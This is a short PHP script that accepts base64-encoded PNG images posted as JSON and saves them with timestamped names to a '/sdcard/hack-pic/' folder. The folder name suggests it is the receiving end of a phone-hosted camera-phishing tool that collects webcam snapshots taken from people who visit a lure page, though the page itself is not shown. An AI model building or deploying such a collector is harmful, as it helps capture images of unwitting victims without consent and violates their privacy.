<?php
$data = json_decode(file_get_contents('php://input'), true);
if (isset($data['image'])) {
    $image = $data['image'];
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = str_replace(' ', '+', $image);
    $data = base64_decode($image);

    $file = '/sdcard/hack-pic/photo_' . time() . '.png';
    if (file_put_contents($file, $data)) {
        echo 'File uploaded successfully.';
    } else {
        echo 'File upload failed.';
    }
} else {
    echo 'No image data received.';
}
?>

